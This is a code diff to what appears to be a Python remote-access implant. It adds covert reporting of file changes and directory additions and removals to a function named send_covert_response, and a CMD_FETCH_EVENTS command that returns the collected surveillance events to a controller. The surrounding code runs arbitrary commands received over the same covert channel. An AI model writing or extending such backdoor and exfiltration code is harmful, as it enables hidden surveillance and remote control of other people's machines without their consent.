@@ -157,8 +157,10 @@ def monitor_file(path):
         if mtime != last_mtime:
             last_mtime = mtime
             ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+            event_str = f"{ts}: File {path} modified."
             with data_lock:
-                mon_file_events.append(f"{ts}: File {path} modified.")
+                mon_file_events.append(event_str)
+            send_covert_response(f"MON_FILE_MODIFIED:{path}:{ts}".encode())
         time.sleep(1)
     # When mon_file_path is changed (stop or new path), thread will exit.
 
@@ -180,9 +182,11 @@ def monitor_directory(path):
         for a in added:
             ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
             mon_dir_events.append(f"{ts}: File '{a}' added to {path}.")
+            send_covert_response(f"MON_DIR_ADDED:{path}:{a}:{ts}".encode())
         for r in removed:
             ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
             mon_dir_events.append(f"{ts}: File '{r}' removed from {path}.")
+            send_covert_response(f"MON_DIR_REMOVED:{path}:{r}:{ts}".encode())
         prev_contents = current_contents
         time.sleep(1)
 
@@ -523,6 +527,13 @@ def main():
             cmd_to_run = command_str.split(":", 1)[1]
             result = run_program(cmd_to_run)
             send_covert_response(result.encode())
+        elif command_str.startswith("CMD_FETCH_EVENTS"):
+            with data_lock:
+                events = mon_file_events + mon_dir_events
+                mon_file_events.clear()
+                mon_dir_events.clear()
+            payload = "\n".join(events).encode() if events else b"No new events."
+            send_covert_response(payload)
         else:
             # Unknown command
             send_covert_response(f"ERR: Unknown command {command_str}".encode())
